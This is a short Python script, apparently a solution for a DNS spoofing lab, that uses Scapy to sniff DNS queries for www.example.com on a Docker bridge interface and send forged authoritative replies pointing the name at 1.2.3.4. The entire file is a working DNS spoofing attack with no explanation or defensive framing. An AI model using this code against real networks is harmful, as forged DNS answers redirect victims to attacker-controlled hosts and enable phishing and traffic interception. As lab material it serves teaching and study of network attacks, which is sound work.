#!/usr/bin/env python3
from scapy.all import *

NS_NAME = "www.example.com"

def spoof_dns(pkt):
    if DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8'):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)  # dst is DNS server
        udp = UDP(dport=pkt[UDP].sport, sport=53)
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='1.2.3.4')

        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                  qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)
        spoofpkt = ip/udp/dns
        send(spoofpkt)

iface = "br-233f3ca0592c"
f = "udp and dst port 53"
sniff(iface=iface, filter=f, prn=spoof_dns)
